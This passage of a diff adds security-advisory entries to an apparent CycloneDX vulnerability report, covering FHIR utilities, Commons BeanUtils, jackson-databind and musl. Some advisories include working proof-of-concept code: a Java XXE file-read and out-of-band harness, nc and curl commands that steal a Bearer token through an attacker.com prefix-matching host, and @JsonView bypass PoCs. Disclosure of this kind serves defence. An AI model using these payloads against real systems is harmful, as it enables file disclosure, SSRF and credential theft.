Files.writeString(secret, CANARY_MARK + \" :: \" + UUID.randomUUID());\n\n    final List<String> oobHits = Collections.synchronizedList(new ArrayList<>());\n    ServerSocket sentinel = new ServerSocket(0);\n    int oobPort = sentinel.getLocalPort();\n    Thread st = new Thread(() -> {\n      try {\n        while (!sentinel.isClosed()) {\n          Socket s = sentinel.accept();\n          BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream(), StandardCharsets.UTF_8));\n          String line = r.readLine();\n          if (line != null) { oobHits.add(line); System.out.println(\"[SENTINEL] inbound connection: \" + line); }\n          byte[] body = \"<!-- ok -->\".getBytes(StandardCharsets.UTF_8); // well-formed empty external DTD\n          OutputStream os = s.getOutputStream();\n          os.write((\"HTTP/1.1 200 OK\\r\\nContent-Type: application/xml-dtd\\r\\nContent-Length: \" + body.length + \"\\r\\n\\r\\n\").getBytes());\n          os.write(body); os.flush(); s.close();\n        }\n      } catch (IOException ignored) {}\n    });\n    st.setDaemon(true); st.start();\n\n    // A1: external general entity -> local secret (file read)\n    // A2: external parameter entity -> attacker URL (blind XXE / SSRF)\n    String maliciousSource =\n        \"<?xml version=\\\"1.0\\\"?>\\n\" +\n        \"<!DOCTYPE root [\\n\" +\n        \"  <!ENTITY canary SYSTEM \\\"\" + secret.toUri() + \"\\\">\\n\" +\n        \"  <!ENTITY % oob SYSTEM \\\"http://127.0.0.1:\" + oobPort + \"/evil-fhir-xslt-ssrf.dtd\\\">\\n\" +\n        \"  %oob;\\n\" +\n        \"]>\\n\" +\n        \"<root><data>&canary;</data></root>\\n\";\n    Path srcFile = Files.createTempFile(\"fhir-malicious-src-\", \".xml\");\n    Files.writeString(srcFile, maliciousSource);\n    Path xsltFile = Files.createTempFile(\"fhir-identity-\", \".xslt\");\n    Files.writeString(xsltFile, IDENTITY_XSLT);\n\n    System.out.println(\"=== Target: org.hl7.fhir.utilities:6.9.8 (XsltUtilities) on JDK \" + System.getProperty(\"java.version\") + \" ===\");\n    System.out.println(\"=== Saxon: \" + saxonVersion() + \" ===\");\n    System.out.println(\"Secret file: \" + secret + \" (contains \" + CANARY_MARK + \")\");\n    System.out.println(\"OOB sentinel: http://127.0.0.1:\" + oobPort + \"/\\n\");\n\n    System.out.println(\"---- ATTACK: XsltUtilities.saxonTransform(source, xslt)  [BARE TransformerFactoryImpl] ----\");\n    try {\n      String out = XsltUtilities.saxonTransform(srcFile.toString(), xsltFile.toString());\n      System.out.println(\"transform output: [\" + out.trim() + \"]\");\n      System.out.println(out.contains(CANARY_MARK)\n        ? \">>> XXE CONFIRMED: canary leaked into XSLT output via external entity <<<\"\n        : \">>> canary NOT in output <<<\");\n    } catch (Exception e) { System.out.println(\"saxonTransform threw: \" + e); }\n    Thread.sleep(400);\n    System.out.println(\"OOB sentinel hits after BARE call: \" + oobHits + \"\\n\");\n\n    // Direct factory comparison (isolates the hardening difference)\n    System.out.println(\"---- DIRECT FACTORY COMPARISON (same malicious source, identity XSLT) ----\");\n    int b = oobHits.size();\n    System.out.println(\"[bare new TransformerFactoryImpl()]\");\n    runDirect(new net.sf.saxon.TransformerFactoryImpl(), srcFile, xsltFile, oobHits, b);\n    int b2 = oobHits.size();\n    System.out.println(\"[hardened XMLUtil.newXXEProtectedTransformerFactory()]\");\n    runDirect(org.hl7.fhir.utilities.xml.XMLUtil.newXXEProtectedTransformerFactory(), srcFile, xsltFile, oobHits, b2);\n    sentinel.close();\n  }\n\n  static void runDirect(javax.xml.transform.TransformerFactory f, Path srcFile, Path xsltFile, List<String> oobHits, int before) throws Exception {\n    try {\n      javax.xml.transform.Transformer t = f.newTransformer(new javax.xml.transform.stream.StreamSource(Files.newInputStream(xsltFile)));\n      ByteArrayOutputStream out = new ByteArrayOutputStream();\n      t.transform(new javax.xml.transform.stream.StreamSource(Files.newInputStream(srcFile)), new javax.xml.transform.stream.StreamResult(out));\n      String s = out.toString(StandardCharsets.UTF_8).trim();\n      System.out.println(\"  output: [\" + s + \"]\");\n      System.out.println(\"  canary leaked: \" + s.contains(CANARY_MARK));\n    } catch (Exception e) {\n      System.out.println(\"  threw: \" + e.getClass().getName() + \": \" + String.valueOf(e.getMessage()).replaceAll(\"[\\\\u4e00-\\\\u9fff]\", \"?\"));\n    }\n    Thread.sleep(300);\n    System.out.println(\"  OOB sentinel hits from this call: \" + (oobHits.size() - before));\n  }\n\n  static String saxonVersion() {\n    try { return (String) Class.forName(\"net.sf.saxon.Version\").getMethod(\"getProductVersion\").invoke(null); }\n    catch (Throwable t) { return \"unknown\"; }\n  }\n}\n```\n\nRun + **verbatim captured output** (JDK 17.0.18, Saxon-HE 11.6; CJK in the\nhardened-path SAXParseException replaced with `?` by the harness for ASCII\ndisplay, the message text is `accessExternalDTD ... restriction ... 'http'\naccess not allowed`):\n\n```\n$ mvn -q compile && mvn -q exec:java -Dexec.mainClass=Poc\n=== Target: org.hl7.fhir.utilities:6.9.8 (XsltUtilities) on JDK 17.0.18 ===\n=== Saxon: 11.6 ===\nSecret file: /var/folders/.../fhir-secret-467000002121832365.txt (contains TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2)\nOOB sentinel: http://127.0.0.1:62466/\n\n---- ATTACK: XsltUtilities.saxonTransform(source, xslt)  [BARE TransformerFactoryImpl] ----\n[SENTINEL] inbound connection: GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1\ntransform output: [TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: 4e3c33aa-4db1-4f22-880f-6666fedd9da4]\n>>> XXE CONFIRMED: canary leaked into XSLT output via external entity <<<\nOOB sentinel hits after BARE call: [GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1]\n\n---- DIRECT FACTORY COMPARISON (same malicious source, identity XSLT) ----\n[bare new TransformerFactoryImpl()]\n[SENTINEL] inbound connection: GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1\n  output: [TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: 4e3c33aa-4db1-4f22-880f-6666fedd9da4]\n  canary leaked: true\n  OOB sentinel hits from this call: 1\n[hardened XMLUtil.newXXEProtectedTransformerFactory()]\n  threw: net.sf.saxon.trans.XPathException: org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 8; ????: ???????? 'evil-fhir-xslt-ssrf.dtd', ?? accessExternalDTD ???????????? 'http' ??.\n  OOB sentinel hits from this call: 0\n```\n\nInterpretation of the verbatim output:\n\n- **Bare path** (`saxonTransform` and bare `TransformerFactoryImpl`): the local\n  secret file content (`TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: ...`) is leaked\n  into the transform output (file disclosure), and the OOB sentinel receives\n  `GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1` (blind XXE / SSRF). `canary leaked: true`,\n  OOB hits = 1.\n- **Hardened path** (`XMLUtil.newXXEProtectedTransformerFactory()`): parsing the\n  same malicious source throws an `accessExternalDTD ... 'http' access not\n  allowed` SAXParseException and the OOB sentinel receives 0 hits. The only\n  difference between the two runs is the factory: the existing project helper\n  blocks the attack, the bare sibling does not.\n\n### Impact\n\n- **Local file disclosure**: any file readable by the JVM process is exfiltrated\n  into the transform output (demonstrated above with a canary secret file).\n- **Blind XXE / SSRF**: external parameter/DTD entities cause the host to issue\n  attacker-directed HTTP(S) requests (demonstrated by the sentinel hit),\n  enabling internal-network probing and cloud metadata access from the host's\n  network position.\n- The `saxonTransform` overloads are part of the public\n  `org.hl7.fhir.utilities` API consumed across the FHIR Java tooling\n  (IG-publisher / validation / conversion utilities); any consumer that routes\n  attacker-influenced or MITM-able XML through them inherits the XXE.\n\n### Suggested fix\n\nRoute the `saxonTransform` overloads through the same protection the\n`transform` siblings already use. Because these overloads specifically need the\nSaxon implementation, obtain a Saxon factory and apply the two `ACCESS_EXTERNAL_*`\nrestrictions (mirroring `XMLUtil.newXXEProtectedTransformerFactory()`), e.g. a\nsmall helper in `XMLUtil`:\n\n```java\n@SuppressWarnings(\"checkstyle:transformerFactoryNewInstance\")\npublic static TransformerFactory newXXEProtectedSaxonTransformerFactory() {\n    final TransformerFactory f = new net.sf.saxon.TransformerFactoryImpl();\n    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n    return f;\n}\n```\n\nand replace each `new net.sf.saxon.TransformerFactoryImpl()` in\n`XsltUtilities.saxonTransform(...)` (lines 61, 91, 106) with a call to it. This\nmirrors the existing `newXXEProtected*` convention and the class-level mandate\nthat the protected factory \"should be the only place where TransformerFactory\nis instantiated in this project\". A regression test that runs a DOCTYPE-bearing\nsource through `saxonTransform` and asserts the external entity is NOT resolved\nshould accompany the change.\n\n### Credit\n\nReported by tonghuaroot.",
+      "published" : "2026-06-17T18:47:51Z",
+      "updated" : "2026-06-17T18:47:52Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "We don't use the saxonTransform function inside this service"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "68e6b598-f788-48a1-88a2-aaf1f5874a98",
+      "id" : "GHSA-vr79-8m62-wh98",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 9.3,
+          "severity" : "critical",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"
+        }
+      ],
+      "cwes" : [
+        522,
+        552
+      ],
+      "description" : "## Summary\n\nThe FHIR Validator HTTP service exposes an unauthenticated `/loadIG` endpoint that makes outbound HTTP requests to attacker-controlled URLs. Combined with a `startsWith()` URL prefix matching flaw in the credential provider (`ManagedWebAccessUtils.getServer()`), an attacker can steal authentication tokens (Bearer, Basic, API keys) configured for legitimate FHIR servers by registering a domain that prefix-matches a configured server URL.\n\n## Details\n\n**Step 1 — SSRF Entry Point** (`LoadIGHTTPHandler.java:35-43`):\n\nThe `/loadIG` endpoint accepts unauthenticated POST requests with a JSON body containing an `ig` field. The value is passed directly to `IgLoader.loadIg()` with no URL validation or allowlisting. When the value is an HTTP(S) URL, `IgLoader.fetchFromUrlSpecific()` makes an outbound GET request via `ManagedWebAccess.get()`:\n\n```java\n// LoadIGHTTPHandler.java:43\nengine.getIgLoader().loadIg(engine.getIgs(), engine.getBinaries(), igContent, true);\n\n// IgLoader.java:437 (fetchFromUrlSpecific)\nHTTPResult res = ManagedWebAccess.get(Arrays.asList(\"web\"), source + \"?nocache=\" + System.currentTimeMillis());\n```\n\n**Step 2 — Credential Leak via Prefix Matching** (`ManagedWebAccessUtils.java:14`):\n\nWhen `ManagedWebAccess` creates a `SimpleHTTPClient`, it attaches an `authProvider` that uses `startsWith()` to determine whether credentials should be sent:\n\n```java\n// ManagedWebAccessUtils.java:14\nif (url.startsWith(serverDetails.getUrl()) && typesMatch(serverType, serverDetails.getType())) {\n    return serverDetails;\n}\n```\n\nIf the server has `https://packages.fhir.org` configured with a Bearer token, a request to `https://packages.fhir.org.attacker.com/...` matches the prefix, and the token is attached to the request to the attacker's domain.\n\n**Step 3 — Redirect Amplification** (`SimpleHTTPClient.java:84-99,111-118`):\n\n`SimpleHTTPClient` manually follows redirects with `setInstanceFollowRedirects(false)`. On each redirect hop, `getHttpGetConnection()` calls `setHeaders()` which re-evaluates `authProvider.canProvideHeaders(url)` against the **new URL**. This means even an indirect redirect path can trigger credential leakage.\n\n## PoC\n\n**Prerequisites:** A FHIR Validator HTTP server running with `fhir-settings.json` containing:\n```json\n{\n  \"servers\": [{\n    \"url\": \"https://packages.fhir.org\",\n    \"authenticationType\": \"token\",\n    \"token\": \"ghp_SecretTokenForFHIRRegistry123\"\n  }]\n}\n```\n\n**Step 1:** Set up attacker credential capture server:\n```bash\n# On attacker machine, listen for incoming requests\nnc -lp 80 > /tmp/captured_request.txt &\n# Register DNS: packages.fhir.org.attacker.com -> attacker IP\n```\n\n**Step 2:** Trigger the SSRF with prefix-matching URL:\n```bash\ncurl -X POST http://target-validator:8080/loadIG \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"ig\": \"https://packages.fhir.org.attacker.com/malicious-ig\"}'\n```\n\n**Step 3:** Verify credential capture:\n```bash\ncat /tmp/captured_request.txt\n# Expected output includes:\n# GET /malicious-ig?nocache=... HTTP/1.1\n# Authorization: Bearer ghp_SecretTokenForFHIRRegistry123\n# Host: packages.fhir.org.attacker.com\n```\n\n**Redirect variant** (if direct prefix match isn't possible):\n```bash\n# Attacker server returns: HTTP/1.1 302 Location: https://packages.fhir.org.attacker.com/steal\ncurl -X POST http://target-validator:8080/loadIG \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"ig\": \"https://attacker.com/redirect\"}'\n```\n\n## Impact\n\n- **Credential theft**: Attacker steals Bearer tokens, Basic auth credentials, or API keys for any configured FHIR server\n- **Supply chain attack**: Stolen package registry credentials could be used to publish malicious FHIR packages affecting downstream consumers\n- **Data breach**: If credentials grant access to protected FHIR endpoints (e.g., clinical data repositories), patient health records could be exposed\n- **Scope change (S:C)**: The vulnerability in the validator compromises the security of external systems (FHIR registries, package servers) whose credentials are leaked\n\n## Recommended Fix\n\n**Fix 1 — Proper URL origin comparison in ManagedWebAccessUtils** (`ManagedWebAccessUtils.java`):\n```java\npublic static ServerDetailsPOJO getServer(Iterable<String> serverTypes, String url, Iterable<ServerDetailsPOJO> serverAuthDetails) {\n    if (serverAuthDetails != null) {\n      for (ServerDetailsPOJO serverDetails : serverAuthDetails) {\n        for (String serverType : serverTypes) {\n          if (urlMatchesOrigin(url, serverDetails.getUrl()) && typesMatch(serverType, serverDetails.getType())) {\n            return serverDetails;\n          }\n        }\n      }\n    }\n    return null;\n  }\n\n  private static boolean urlMatchesOrigin(String requestUrl, String serverUrl) {\n    try {\n      URL req = new URL(requestUrl);\n      URL srv = new URL(serverUrl);\n      return req.getProtocol().equals(srv.getProtocol())\n          && req.getHost().equals(srv.getHost())\n          && req.getPort() == srv.getPort()\n          && req.getPath().startsWith(srv.getPath());\n    } catch (MalformedURLException e) {\n      return false;\n    }\n  }\n```\n\n**Fix 2 — URL allowlisting in LoadIGHTTPHandler** (`LoadIGHTTPHandler.java`):\n```java\n// Add allowlist validation before loading\nprivate static final Set<String> ALLOWED_HOSTS = Set.of(\n    \"packages.fhir.org\", \"packages2.fhir.org\", \"build.fhir.org\"\n);\n\nprivate boolean isAllowedSource(String ig) {\n    try {\n        URL url = new URL(ig);\n        return ALLOWED_HOSTS.contains(url.getHost());\n    } catch (MalformedURLException e) {\n        return false; // Not a URL, could be a package reference\n    }\n}\n```",
+      "published" : "2026-03-30T17:24:10Z",
+      "updated" : "2026-03-31T18:55:52Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "7aa34dac-8d88-46ba-a1e3-365fad11ec9c",
+      "id" : "GHSA-wxr5-93ph-8wr9",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 8.8,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes" : [
+        284
+      ],
+      "description" : "Improper Access Control vulnerability in Apache Commons.\n\n\n\nA special BeanIntrospector class was added in version 1.9.2. This can be used to stop attackers from using the declared class property of Java enum objects to get access to the classloader. However this protection was not enabled by default. PropertyUtilsBean (and consequently BeanUtilsBean) now disallows declared class level property access by default.\n\n\n\n\n\nReleases 1.11.0 and 2.0.0-M2 address a potential security issue when accessing enum properties in an uncontrolled way. If an application using Commons BeanUtils passes property paths from an external source directly to the getProperty() method of PropertyUtilsBean, an attacker can access the enum’s class loader via the “declaredClass” property available on all Java “enum” objects. Accessing the enum’s “declaredClass” allows remote attackers to access the ClassLoader and execute arbitrary code. The same issue exists with PropertyUtilsBean.getNestedProperty().\nStarting in versions 1.11.0 and 2.0.0-M2 a special BeanIntrospector suppresses the “declaredClass” property. Note that this new BeanIntrospector is enabled by default, but you can disable it to regain the old behavior; see section 2.5 of the user's guide and the unit tests.\n\nThis issue affects Apache Commons BeanUtils 1.x before 1.11.0, and 2.x before 2.0.0-M2.Users of the artifact commons-beanutils:commons-beanutils\n\n 1.x are recommended to upgrade to version 1.11.0, which fixes the issue.\n\n\nUsers of the artifact org.apache.commons:commons-beanutils2\n\n 2.x are recommended to upgrade to version 2.0.0-M2, which fixes the issue.",
+      "published" : "2025-05-28T15:34:34Z",
+      "updated" : "2025-11-03T21:33:59Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "7e538f3b-3931-4c1c-8c27-b4ddf60d99b8",
+      "id" : "GHSA-5jmj-h7xm-6q6v",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 5.3,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "cwes" : [
+        915
+      ],
+      "description" : "## Summary\nIn `BeanDeserializerBase.createContextual()`, per-property `@JsonIgnoreProperties` exclusions are applied by `_handleByNameInclusion()`, producing a `contextual` deserializer whose `BeanPropertyMap` has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by `@JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)`) rebuilds from `this._beanProperties` (the original, unfiltered map) instead of `contextual._beanProperties`, then overwrites the filtered map — restoring every property `_handleByNameInclusion` had just removed. The ignored property becomes writable again.\n\n## Impact\nAn application that both enables case-insensitive matching and relies on per-property `@JsonIgnoreProperties` to keep a field unwritable can have that field set from untrusted JSON (mass-assignment-style write).\n\n## Affected / Patched\nWill be fixed in 2.18.9, 2.21.5, 2.22.1 and 3.1.4.\n\n## Severity / CWE\nMaintainer: minor. Reporter: Moderate. CWE-915.\n\n## Upstream fix\nFasterXML/jackson-databind#5962 (PR #5964, `0e1b0b2`), milestone 3.1.4. Released 2026-06-04.",
+      "published" : "2026-06-23T21:23:58Z",
+      "updated" : "2026-07-16T21:25:47Z",
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "359b531c-400f-4782-be59-e56c50a853ef",
+      "id" : "GHSA-mhm7-754m-9p8w",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.5,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "cwes" : [
+        863
+      ],
+      "description" : "## Summary\n\nIn `BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId`, the active-view (`@JsonView`) filter was applied only to the regular bean-property branch; the creator-property branch performed no `creatorProp.visibleInView(activeView)` check. A constructor parameter annotated with both `@JsonView(RestrictedView.class)` and `@JsonTypeInfo(use=Id.NAME,\n  include=As.EXTERNAL_PROPERTY)` is populated from attacker JSON even when a more restrictive view is active.\n\n  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 (\"Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer\", commit 7dc7a17, 2026-05-22) but\n  **the fix was never backported to 2.21 or 2.18**. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same `@JsonView` bypass technique via a different code path.\n\n## Vulnerable Code Path\n\nFile: `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`\nMethod: `deserializeUsingPropertyBasedWithExternalTypeId`\n\nOn 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks `creatorProp.isInjectionOnly()` and hands off to `ext.handlePropertyValue(...)` / `buffer.assignParameter(...)` without ever consulting `visibleInView(activeView)`:\n\n ```java\n  if (creatorProp != null) {\n      // [databind#1381]: if useInput=FALSE, skip deserialization from input\n      if (creatorProp.isInjectionOnly()) { ... }\n      // NO visibleInView(activeView) CHECK HERE\n      if (!ext.handlePropertyValue(p, ctxt, propName, null)) {\n          if (buffer.assignParameter(creatorProp, ...)) { ... }\n      }\n      continue;\n  }\n```\n\nOn 3.1.4, the same branch contains the additional guard (commit 7dc7a17):\n\n ```java\n   if (creatorProp != null) {\n      // [databind#5971]: must honor active view here too\n      if ((activeView != null) && !creatorProp.visibleInView(activeView)) {\n          p.skipChildren();\n          continue;\n      }\n      ...\n  }\n```\n\nThe 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005\n  with \"got changes merged forward, looks like it's all covered now\", but the forward-merge did not include the ExtTypeId creator branch.\n\n  Proof of Concept\n\n  Compiles and runs against jackson-databind 2.21.4:\n \n```java\n  import com.fasterxml.jackson.annotation.*;\n  import com.fasterxml.jackson.databind.ObjectMapper;\n\n  public class JsonViewExternalTypeIdBypass {\n      public static class PublicView {}\n      public static class AdminView extends PublicView {}\n\n      public static abstract class Asset { public String name; }\n      public static class PublicAsset extends Asset {}\n      public static class AdminAsset extends Asset { public String secret; }\n\n      public static class Container {\n          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,\n                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,\n                  property = \"kind\")\n          @JsonSubTypes({\n              @JsonSubTypes.Type(value = PublicAsset.class, name = \"pub\"),\n              @JsonSubTypes.Type(value = AdminAsset.class,  name = \"admin\")\n          })\n          @JsonView(AdminView.class)\n          public Asset asset;\n\n          public String label;\n\n          @JsonCreator\n          public Container(\n                  @JsonProperty(\"label\") String label,\n                  @JsonProperty(\"asset\") @JsonView(AdminView.class) Asset asset) {\n              this.label = label;\n              this.asset = asset;\n          }\n      }\n\n      public static class Wrapper {\n          @JsonView(PublicView.class)\n          public Container data;\n      }\n\n      public static void main(String[] args) throws Exception {\n          // Admin-only \"asset\" should be blocked when reading with PublicView\n          String json = \"{\\\"data\\\":{\\\"label\\\":\\\"hello\\\",\\\"kind\\\":\\\"admin\\\",\"\n                      + \"\\\"asset\\\":{\\\"name\\\":\\\"foo\\\",\\\"secret\\\":\\\"LEAKED\\\"}}}\";\n\n          ObjectMapper om = new ObjectMapper();\n          Wrapper r = om.readerWithView(PublicView.class)\n                  .forType(Wrapper.class)\n                  .readValue(json);\n\n          System.out.println(r.data);\n          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}\n          // Expected (secure):  Container{label='hello', asset=null}\n          if (r.data.asset != null && r.data.asset instanceof AdminAsset) {\n              System.out.println(\"[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView\");\n          }\n      }\n  }\n```\n\nA control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId\n  code path and not a misconfiguration.\n\n### Impact\n\n  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot\n  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing\n  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.\n\n- CWE-863 (Incorrect Authorization)\n- Same impact class as CVE-2026-54517 / CVE-2026-54518\n- No RCE, no DoS — this is an access-control / mass-assignment bypass\n\n### Trigger Conditions\n\nDeveloper code must combine (no opt-in user configuration required):\n\n1. Property-based @JsonCreator on the outer type\n2. A creator parameter annotated with @JsonView(RestrictedView.class)\n3. The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property=\"...\")",
+      "published" : "2026-07-21T19:40:12Z",
+      "updated" : "2026-07-21T19:40:13Z",
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "9b0a5f61-5fe7-4598-9226-4cb4ae572991",
+      "id" : "GHSA-5gvw-p9qm-jgwh",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.5,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        863
+      ],
+      "description" : "## Summary\n`UnwrappedPropertyHandler.processUnwrapped()` replays the buffered JSON for a `@JsonUnwrapped` property by iterating its properties and calling `prop.deserializeAndSet()` with **no `prop.visibleInView(ctxt.getActiveView())` guard** — the exact guard `processUnwrappedCreatorProperties()` received in the #5971 / GHSA-rcqc-6cw3-h962 fix, and the guard `BeanDeserializer.deserializeWithUnwrapped` applies to directly-matched properties. As a result, a property annotated with both `@JsonView(PrivilegedView.class)` and `@JsonUnwrapped` is written from attacker JSON even when deserializing under a more-restrictive active view.\n\n**Correction to the original framing (runtime-verified):** the gap is NOT a per-field inner `@JsonView` (the unwrapped sub-object's own `BeanDeserializer` gates inner fields correctly). The unchecked gate is the **view of the unwrapped CONTAINER property**.\n\n## Intent proof (runtime, 2.x HEAD 21dd70dd and 3.x HEAD 7a5939d6)\nAn `@JsonView(AdminView)` property that is NOT `@JsonUnwrapped` → `null` under `PublicView` (correctly gated). The identical property WITH `@JsonUnwrapped` → fully populated (bypass). The fix the creator path already received, not applied to the regular-property method.\n\n## Impact — write-side mass-assignment / privilege escalation\n`@JsonView` is commonly used as a write-side authorization guard: a public endpoint binds the body under `readerWithView(PublicView.class)` and groups privileged state in a nested object whose container property is `@JsonView(AdminView)`. When that property is `@JsonUnwrapped`, an untrusted caller mass-assigns it. PoC: a self-service registration where `AccountFlags{role,approved,creditBalance}` is `@JsonView(AdminView) @JsonUnwrapped`; attacker JSON `{role:ADMIN,approved:true,creditBalance:1000000}` under `PublicView` binds all three → approved admin with arbitrary balance. The failing gate is a WRITE gate, hence integrity-high (`C:N/I:H/A:N`); no worse than the C:L/I:L parent and arguably higher as `@JsonView`-as-write-guard is the exact use case #5971/#5969 defended.\n\n## Affected\n- `com.fasterxml.jackson.core:jackson-databind` 2.x: confirmed bypass at 21dd70dd (== released 2.21.4 / 2.22.0 line; includes the #5973 backport). `DEFAULT_VIEW_INCLUSION` default=true.\n- `tools.jackson.core:jackson-databind` 3.x: confirmed bypass at HEAD 7a5939d6 (latest 3.x). `DEFAULT_VIEW_INCLUSION` default=false → the stock-config repro is the common shape where privileged inner fields are individually `@JsonView(PublicView)` and the developer relies on the container `@JsonView(AdminView)`; the 3.x PoC mass-assigns role/approved/creditBalance under PublicView. (The other simultaneous report's PoC was reportedly fixed on 3.x; this distinct container-property path is not.)\n\n## Additive variants (runtime-confirmed both branches; all closed by the same one-line guard)\n- nested `@JsonUnwrapped` (unwrapped-in-unwrapped) — recursive bypass.\n- merge / `readerWithView(...).withValueToUpdate(...)` (PATCH/partial-update) — bypass; non-unwrapped merge control gates correctly.\n- builder-based deserializer (`@JsonDeserialize(builder=...)`) — `BuilderBasedDeserializer` routes through the same `processUnwrapped`.\n- Honest non-findings: read-side serialization correctly honors views (no leak); `@JsonAnySetter`+view and `@JsonTypeInfo`+`@JsonUnwrapped` are separate/unsupported behaviors, not this bug.\n\n## Fix\nAdd `prop.visibleInView(ctxt.getActiveView())` (when `MapperFeature.DEFAULT_VIEW_INCLUSION`/active-view applies) to the `processUnwrapped()` property loop, mirroring `processUnwrappedCreatorProperties()`. One change closes the impact PoC + all three variants across `BeanDeserializer` and `BuilderBasedDeserializer`. Full runnable PoCs (2.x + 3.x) + variant harnesses available on request.",
+      "published" : "2026-07-21T22:00:43Z",
+      "updated" : "2026-08-03T20:51:32Z",
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "50acd5f1-0856-4a1c-b1d9-9cbd154209e5",
+      "id" : "CVE-2025-26519",
+      "source" : {
+        "name" : "NVD",
+        "url" : "https://nvd.nist.gov/"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "NVD",
+            "url" : "https://nvd.nist.gov/"
+          },
+          "score" : 7.0,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes" : [
+        787
+      ],
+      "description" : "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
